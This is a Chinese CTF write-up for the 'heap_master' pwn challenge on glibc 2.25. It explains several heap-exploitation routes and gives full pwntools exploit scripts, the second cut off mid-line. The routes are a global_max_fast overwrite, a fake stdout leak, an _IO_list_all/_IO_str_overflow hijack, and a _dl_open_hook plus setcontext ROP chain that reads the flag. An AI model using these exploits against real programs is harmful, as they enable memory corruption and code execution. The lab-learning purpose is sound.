<h4 id="伪造文件结构体泄露"><a href="#伪造文件结构体泄露" class="headerlink" title="伪造文件结构体泄露"></a>伪造文件结构体泄露</h4><p>通过ub attck修改global_max_fast(同样是部分写small bin的残留libc指针)，使得我们用到的size对应的chunk基本都进fastbin。我们知道main_arena的+8开始存储的是各个size(0x20-0x80)的fastbin的头指针。一旦突破这个限制之后就可以<code>将main_arena后的地址覆写为map地址</code>。也就是说我们可以将main_arena后的stdout指针的内容覆写为一个map_addr，进而使得stdout使用map_addr上伪造的文件结构体进行puts和printf。这里的伪造最好先copy一下正常_IO_2_1_stdout_的结构体内容(一直到vtable)。之后部分写里面的内容，最终泄露libc地址和map地址(_IO_write_base和_IO_write_ptr之间的就是泄露的内容，改成stdout地址及其+8即可)。</p>
<h3 id="get-flag-shell"><a href="#get-flag-shell" class="headerlink" title="get flag/shell"></a>get flag/shell</h3><p>get shell的方法也有很多，非常地精妙，本来我是应该把自己复现过程再搞一遍截图发的，但是期末复习时间实在太紧，就只讲思路了，后面会给参考链接去看大佬们的博客有调试详情。原题是glibc 2.25，开了chroot限制get shell，所以只能orw。  </p>
<h4 id="IO-list-all"><a href="#IO-list-all" class="headerlink" title="_IO_list_all"></a>_IO_list_all</h4><p>先用large bin attack改_IO_list_all为map地址，伪造map地址为fake file。在调用exit的时候会执行_IO_flush_all_lockp，经过<code>fflush</code>获取_IO_FILE_plus调用其中的_IO_str_overflow。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Edit(fake_file+<span class="number">0xd8</span>,_IO_str_jumps)</span><br><span class="line">Edit(fake_file+<span class="number">0xe0</span>,call_func)</span><br></pre></td></tr></table></figure>
<p>跟着调试会发现_IO_str_overflow里调用的参数rdi为map_addr，往后看会有一次赋值操作将rdi+0x28的值放入了rdx，我们在map地址把这个值改成<code>pop rsp;pop r13;ret</code>的地址，在fake_file+0xe0的位置我们设置其值为<code>pop rbx ; pop rbp ; jmp rdx</code>的地址，最后会跳转到pop rsp这里，进而将栈劫持到我们的map地址处。最后构造orw读取flag。</p>
<h4 id="dl-open-hook-amp-amp-setcontext-53"><a href="#dl-open-hook-amp-amp-setcontext-53" class="headerlink" title="_dl_open_hook &amp;&amp; setcontext+53"></a>_dl_open_hook &amp;&amp; setcontext+53</h4><p>这里有个有趣的知识，是官网wp给的。通过largebin attack将_dl_open_hook覆盖为map_addr，通过malloc或者free报错的方式，程序会把该值加载到寄存器，再call寄存器，在题目的libc下，寄存器为rbx。<br>题目的libc还有这样一个gadges:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7FD7D: mov     rdi, [rbx+48h]</span><br><span class="line">         mov     rsi, r13</span><br><span class="line">         call    qword ptr [rbx+40h]</span><br></pre></td></tr></table></figure></p>
<p>我们通过设置rbx+0x48可以设置rdi，设置rbx+0x40可以设置call_func。我们的call_func设置的是<code>setcontext+53</code>，有了rdi，可以控制<code>rdi+0xa8</code>，即<code>rcx</code>，这是最后会调用的函数地址，以及<code>rdi+0xa0</code>，这是函数执行完会ret到的地址，所以我们设置参数，调用mprotect修改map地址属性为rwx，ret到map里存shellcode的地方执行orw。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7ffff7a7a565 &lt;setcontext+53&gt;:      mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">0x7ffff7a7a56c &lt;setcontext+60&gt;:      mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">0x7ffff7a7a573 &lt;setcontext+67&gt;:      mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">0x7ffff7a7a577 &lt;setcontext+71&gt;:      mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">0x7ffff7a7a57b &lt;setcontext+75&gt;:      mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">0x7ffff7a7a57f &lt;setcontext+79&gt;:      mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">0x7ffff7a7a583 &lt;setcontext+83&gt;:      mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">0x7ffff7a7a587 &lt;setcontext+87&gt;:      mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">0x7ffff7a7a58e &lt;setcontext+94&gt;:      push   rcx</span><br><span class="line">0x7ffff7a7a58f &lt;setcontext+95&gt;:      mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">0x7ffff7a7a593 &lt;setcontext+99&gt;:      mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">0x7ffff7a7a59a &lt;setcontext+106&gt;:     mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">0x7ffff7a7a5a1 &lt;setcontext+113&gt;:     mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">0x7ffff7a7a5a5 &lt;setcontext+117&gt;:     mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">0x7ffff7a7a5a9 &lt;setcontext+121&gt;:     mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">0x7ffff7a7a5ad &lt;setcontext+125&gt;:     xor    eax,eax</span><br><span class="line">0x7ffff7a7a5af &lt;setcontext+127&gt;:     ret</span><br></pre></td></tr></table></figure>
<h4 id="利用fastbin放入fastbinY的性质"><a href="#利用fastbin放入fastbinY的性质" class="headerlink" title="利用fastbin放入fastbinY的性质"></a>利用fastbin放入fastbinY的性质</h4><p>先拿ub改global_max_fast，之后可以通过计算算出<strong>free_hook这里作为fastbinY应当存的fastbin的size，之后释放一个伪造成这个size的chunk，从而使得</strong>free_hook里放入这个map_addr，再修改map_addr-&gt;fd为system，分配得到这个chunk，即可让__free_hook里写入system(原理同fastbin改fd是一样的)。<br>除了释放，我们也可以直接largebin attack改_free_hook为victim地址。计算改size，再分配这个chunk，最后是一样的效果。</p>
<h3 id="IO-list-all-py"><a href="#IO-list-all-py" class="headerlink" title="_IO_list_all.py"></a>_IO_list_all.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK):</span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK):</span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK):</span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)</span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path))</span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x2620</span></span><br><span class="line">    elf = ELF(<span class="string">'./heap_master'</span>)</span><br><span class="line">    p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x5600</span></span><br><span class="line">    elf = change_ld(<span class="string">"./heap_master"</span>,<span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">    p = elf.process(env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    offset = <span class="number">0x8800</span><span class="number">-0x7a0</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#set two main_arena addr</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>+<span class="number">0x100</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#recover</span></span><br><span class="line">    <span class="comment">#Edit(0x330+0x30,p64(0)+p64(0x411))#2 again</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0x3f0</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x8</span>,p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p16(stdout_addr<span class="number">-0x10</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x18</span>+<span class="number">0x8</span>,p64(<span class="number">0</span>)+p16(stdout_addr+<span class="number">0x19</span><span class="number">-0x20</span>))</span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p.recvn(<span class="number">0x18</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd06e0</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">        <span class="comment">#map</span></span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0xc13b1800</span><span class="number">-0xc13a9000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd5683</span><span class="number">-0x7ffff7a37000</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    log.success(<span class="string">"map addr =&gt; "</span> + hex(map_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line">    libc.address =  libc_base</span><br><span class="line">    io_list_all = libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p64(io_list_all<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(io_list_all<span class="number">-0x20</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    io_heap_addr = map_addr + offset + <span class="number">0x8a0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        _IO_str_jumps = libc_base + (<span class="number">0x7ffff7dd07a0</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">        p_rsp = libc_base + <span class="number">0x0000000000003838</span></span><br><span class="line">        p_rsp_r13 = libc_base + <span class="number">0x00000000000206c3</span></span><br><span class="line">        p_rbx_rbp_jrdx = libc_base + <span class="number">0x000000000012d751</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        p_rdi = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line">        p_rdx_rsi = libc_base + <span class="number">0x00000000001150c9</span></span><br><span class="line">        p_rax = libc_base + <span class="number">0x0000000000033544</span></span><br><span class="line">        syscall = libc_base + <span class="number">0x00000000000bc375</span></span><br><span class="line">    <span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">        _IO_str_jumps = libc_base + <span class="number">0x39A500</span></span><br><span class="line">        p_rsp = libc_base + <span class="number">0x0000000000003870</span></span><br><span class="line">        p_rsp_r13 = libc_base + <span class="number">0x000000000001fd94</span></span><br><span class="line">        p_rbx_rbp_jrdx = libc_base + <span class="number">0x0000000000111271</span></span><br><span class="line"></span><br><span class="line">        p_rdi = libc_base + <span class="number">0x000000000001feea</span></span><br><span class="line">        p_rdx_rsi = libc_base + <span class="number">0x00000000000f9619</span></span><br><span class="line">        p_rax = libc_base + <span class="number">0x0000000000036d98</span></span><br><span class="line">        syscall = libc_base + <span class="number">0x00000000000aa6b5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    fake_file = p64(<span class="number">0</span>) + p64(p_rsp) + p64(map_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(p_rsp_r13)</span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>,fake_file)</span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>+<span class="number">0xd8</span>,p64(_IO_str_jumps))</span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>+<span class="number">0xe0</span>,p64(p_rbx_rbp_jrdx))</span><br><span class="line">    orw = [</span><br><span class="line">            p_rdi,map_addr,</span><br><span class="line">            p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">            p_rax,<span class="number">2</span>,</span><br><span class="line">            syscall,</span><br><span class="line">            p_rdi,<span class="number">3</span>,</span><br><span class="line">            p_rdx_rsi,<span class="number">0x30</span>,map_addr+<span class="number">0x200</span>,</span><br><span class="line">            p_rax,<span class="number">0</span>,</span><br><span class="line">            syscall,</span><br><span class="line">            p_rdi,<span class="number">1</span>,</span><br><span class="line">            p_rdx_rsi,<span class="number">0x30</span>,map_addr+<span class="number">0x200</span>,</span><br><span class="line">            p_rax,<span class="number">1</span>,</span><br><span class="line">            syscall</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        Edit(<span class="number">0</span>,<span class="string">'./flag\x00\x00'</span>+flat(orw))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Edit(<span class="number">0x8800</span>,<span class="string">'./flag\x00\x00'</span>+flat(orw))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b *_IO_str_overflow')</span></span><br><span class="line">    <span class="comment">#/libio/</span></span><br><span class="line">    Exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="dl-open-hook-setcontext-py"><a href="#dl-open-hook-setcontext-py" class="headerlink" title="_dl_open_hook_setcontext.py"></a>_dl_open_hook_setcontext.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK):</span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK):</span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK):</span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)</span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path))</span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x2620</span></span><br><span class="line">    elf = ELF(<span class="string">'./heap_master'</span>)</span><br><span class="line">    p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x5600</span></span><br><span class="line">    elf = change_ld(<span class="string">"./heap_master"</span>,<span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">    p = elf.process(env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span 